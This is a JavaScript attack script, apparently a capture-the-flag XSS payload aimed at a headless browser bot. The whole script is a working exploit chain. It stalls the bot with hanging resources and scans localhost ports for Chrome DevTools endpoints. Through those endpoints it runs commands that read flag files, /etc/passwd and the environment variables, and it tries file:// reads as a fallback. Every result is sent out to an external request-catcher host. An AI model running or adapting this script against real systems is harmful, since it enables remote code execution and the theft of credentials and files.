(function() {
    'use strict';
    
    const SERVER = 'https://aab.requestcatcher.com';
    
    // =================================================================
    // UTILITY - Send data as readable text
    // =================================================================
    
    function send(endpoint, data) {
        try {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', SERVER + '/' + endpoint, true);
            xhr.setRequestHeader('Content-Type', 'text/plain');
            xhr.send(data);
        } catch(e) {
            console.error('Send failed:', e);
        }
    }
    
    function log(msg) {
        const message = '[' + new Date().toISOString() + '] ' + msg;
        send('log', message);
        console.log('[EXFIL]', msg);
    }
    
    // =================================================================
    // STEP 1: HOLD THE BOT FIRST (CRITICAL!)
    // =================================================================
    
    function holdBot() {
        log('🔒 HOLDING BOT - Adding hanging resources...');
        
        // Add exactly 6 long-sleeping scripts (browser connection limit)
        for (let i = 0; i < 6; i++) {
            const script = document.createElement('script');
            script.src = `https://httpstat.us/200?sleep=600000&type=script&n=${i}`;
            document.head.appendChild(script);
        }
        
        // Add 6 long-sleeping stylesheets
        for (let i = 0; i < 6; i++) {
            const link = document.createElement('link');
            link.rel = 'stylesheet';
            link.href = `https://httpstat.us/200?sleep=600000&type=css&n=${i}`;
            document.head.appendChild(link);
        }
        
        // Continuously add new resources to keep page loading forever
        setInterval(() => {
            const img = new Image();
            img.src = `https://httpstat.us/200?sleep=300000&type=img&t=${Date.now()}`;
            img.style.display = 'none';
            document.body.appendChild(img);
            log('➕ Added new hanging resource');
        }, 240000); // Every 4 minutes
        
        log('✅ Bot is HELD - page.goto() will never resolve');
    }
    
    // HOLD BOT IMMEDIATELY!
    holdBot();
    
    // =================================================================
    // STEP 2: SMART CDP PORT SCANNER
    // =================================================================
    
    function scanCDPPorts() {
        log('🔍 Starting smart CDP port scan...');
        
        // Common CDP ports (scan these first)
        const commonPorts = [9222, 9223, 9224, 9229, 9230];
        
        // Extended range for thorough scan
        const extendedRanges = [
            [9000, 9300],   // Common debug range
            [3000, 3100],   // Common app range
            [8000, 8100],   // Common HTTP range
            [40000, 41000]  // High port range (some configs use this)
        ];
        
        let scannedCount = 0;
        let foundCount = 0;
        
        // Scan with delay to avoid overwhelming browser
        function scanPort(port, callback) {
            fetch(`http://localhost:${port}/json`, {
                method: 'GET',
                mode: 'cors'
            })
            .then(r => {
                if (r.ok) {
                    return r.json();
                }
                throw new Error('Not CDP');
            })
            .then(data => {
                foundCount++;
                const output = `
========================================
🎯 CDP FOUND!
========================================
PORT: ${port}
TABS: ${data.length}
TIME: ${new Date().toISOString()}
========================================
${JSON.stringify(data, null, 2)}
========================================
WEBSOCKET: ${data[0]?.webSocketDebuggerUrl || 'N/A'}
========================================
`;
                send('CDP-FOUND-' + port, output);
                log(`🎉 CDP FOUND on port ${port}! Total found: ${foundCount}`);
                
                // Exploit it!
                if (data[0]?.webSocketDebuggerUrl) {
                    exploitCDP(port, data);
                }
                
                if (callback) callback();
            })
            .catch(() => {
                // Port not open or not CDP - silent fail
                if (callback) callback();
            });
            
            scannedCount++;
        }
        
        // Phase 1: Scan common ports first (fast)
        log(`📡 Phase 1: Scanning ${commonPorts.length} common ports...`);
        
        let index = 0;
        function scanNext() {
            if (index < commonPorts.length) {
                scanPort(commonPorts[index], scanNext);
                index++;
            } else {
                log(`✅ Phase 1 complete: ${scannedCount} ports scanned, ${foundCount} CDP found`);
                startPhase2();
            }
        }
        scanNext();
        
        // Phase 2: Scan extended ranges (slower, with delays)
        function startPhase2() {
            log(`📡 Phase 2: Scanning extended ranges (this will take time)...`);
            
            extendedRanges.forEach((range, rangeIndex) => {
                const [start, end] = range;
                const rangeSize = end - start;
                
                for (let port = start; port <= end; port++) {
                    // Stagger requests to avoid overwhelming
                    const delay = (port - start) * 100; // 100ms between each
                    
                    setTimeout(() => {
                        scanPort(port);
                    }, delay + (rangeIndex * rangeSize * 100));
                }
            });
        }
    }
    
    // Start scanning after bot is held
    setTimeout(scanCDPPorts, 1000);
    
    // =================================================================
    // STEP 3: EXPLOIT CDP FOR RCE
    // =================================================================
    
    function exploitCDP(port, tabs) {
        if (!tabs || tabs.length === 0) {
            log(`⚠️ No tabs found for port ${port}`);
            return;
        }
        
        const wsUrl = tabs[0].webSocketDebuggerUrl;
        if (!wsUrl) {
            log(`⚠️ No WebSocket URL for port ${port}`);
            return;
        }
        
        log(`🚀 Exploiting CDP on port ${port}...`);
        
        try {
            const ws = new WebSocket(wsUrl);
            
            ws.onopen = () => {
                log(`✅ CDP WebSocket connected to port ${port}!`);
                
                // Commands to execute
                const commands = [
                    {
                        id: 1,
                        desc: 'Read /flag.txt',
                        method: 'Runtime.evaluate',
                        params: { expression: `require('fs').readFileSync('/flag.txt', 'utf8')` }
                    },
                    {
                        id: 2,
                        desc: 'Read /app/flag.txt',
                        method: 'Runtime.evaluate',
                        params: { expression: `require('fs').readFileSync('/app/flag.txt', 'utf8')` }
                    },
                    {
                        id: 3,
                        desc: 'List /app directory',
                        method: 'Runtime.evaluate',
                        params: { expression: `require('child_process').execSync('ls -la /app').toString()` }
                    },
                    {
                        id: 4,
                        desc: 'Find all flag files',
                        method: 'Runtime.evaluate',
                        params: { expression: `require('child_process').execSync('find / -name "*flag*" 2>/dev/null').toString()` }
                    },
                    {
                        id: 5,
                        desc: 'Read /etc/passwd',
                        method: 'Runtime.evaluate',
                        params: { expression: `require('fs').readFileSync('/etc/passwd', 'utf8')` }
                    },
                    {
                        id: 6,
                        desc: 'Get environment variables',
                        method: 'Runtime.evaluate',
                        params: { expression: `JSON.stringify(process.env, null, 2)` }
                    },
                    {
                        id: 7,
                        desc: 'Get current directory',
                        method: 'Runtime.evaluate',
                        params: { expression: `process.cwd()` }
                    },
                    {
                        id: 8,
                        desc: 'Whoami',
                        method: 'Runtime.evaluate',
                        params: { expression: `require('child_process').execSync('whoami').toString()` }
                    }
                ];
                
                // Send commands with delay
                commands.forEach((cmd, i) => {
                    setTimeout(() => {
                        ws.send(JSON.stringify(cmd));
                        log(`📤 Sent CDP command #${cmd.id}: ${cmd.desc}`);
                    }, i * 1000); // 1 second between commands
                });
            };
            
            ws.onmessage = (event) => {
                try {
                    const response = JSON.parse(event.data);
                    
                    if (response.result && response.result.result) {
                        const value = response.result.result.value || response.result.result.description || 'No value';
                        
                        const output = `
========================================
💎 CDP RCE SUCCESS
========================================
PORT: ${port}
COMMAND ID: ${response.id}
TIME: ${new Date().toISOString()}
========================================
RESULT:
${value}
========================================
`;
                        send('RCE-' + port + '-cmd-' + response.id, output);
                        log(`✅ CDP RCE result received for command #${response.id}`);
                    } else if (response.error) {
                        const errorOutput = `
========================================
❌ CDP RCE ERROR
========================================
PORT: ${port}
COMMAND ID: ${response.id}
ERROR: ${JSON.stringify(response.error, null, 2)}
========================================
`;
                        send('RCE-ERROR-' + port + '-cmd-' + response.id, errorOutput);
                        log(`❌ CDP command #${response.id} failed: ${response.error.message}`);
                    }
                } catch(e) {
                    log(`⚠️ Failed to parse CDP response: ${e.message}`);
                }
            };
            
            ws.onerror = (e) => {
                log(`❌ CDP WebSocket error on port ${port}: ${e.message || 'Unknown error'}`);
            };
            
            ws.onclose = () => {
                log(`🔌 CDP WebSocket closed for port ${port}`);
            };
            
        } catch(e) {
            log(`❌ CDP exploitation failed for port ${port}: ${e.message}`);
        }
    }
    
    // =================================================================
    // STEP 4: FALLBACK - TRY FILE READING
    // =================================================================
    
    function tryFileReading() {
        log('📁 Attempting direct file access...');
        
        const files = [
            'file:///flag.txt',
            'file:///app/flag.txt',
            'file:///etc/passwd',
            'file:///proc/self/environ'
        ];
        
        files.forEach((path, i) => {
            setTimeout(() => {
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', path, false); // Synchronous
                    xhr.send();
                    
                    if ((xhr.status === 200 || xhr.status === 0) && xhr.responseText) {
                        const output = `
========================================
📄 FILE READ SUCCESS
========================================
PATH: ${path}
SIZE: ${xhr.responseText.length} bytes
========================================
${xhr.responseText}
========================================
`;
                        send('FILE-' + i, output);
                        log(`✅ Read file: ${path}`);
                    }
                } catch(e) {
                    log(`❌ Cannot read ${path}: ${e.message}`);
                }
            }, i * 500);
        });
    }
    
    setTimeout(tryFileReading, 2000);
    
    // =================================================================
    // STEP 5: HEARTBEAT & STATUS
    // =================================================================
    
    let heartbeat = 0;
    setInterval(() => {
        heartbeat++;
        const status = `
========================================
💓 HEARTBEAT #${heartbeat}
========================================
Time: ${new Date().toISOString()}
Status: Bot is ALIVE and HELD
Page Loading: TRUE (page.goto() blocked)
========================================
`;
        send('heartbeat-' + heartbeat, status);
        log(`💓 Heartbeat #${heartbeat}`);
    }, 60000); // Every 1 minute
    
    // =================================================================
    // INITIALIZATION COMPLETE
    // =================================================================
    
    const initMessage = `
========================================
🚀 EXFILTRATION SCRIPT INITIALIZED
========================================
Time: ${new Date().toISOString()}
Server: ${SERVER}
Status: Bot HELD successfully
========================================
TASKS:
1. ✅ Bot held with hanging resources
2. 🔄 CDP port scanning in progress
3. 🔄 File reading attempted
4. ✅ Heartbeat started (60s intervals)
========================================
`;
    send('INIT', initMessage);
    log('🚀 Exfiltration script initialized successfully');
    
})();
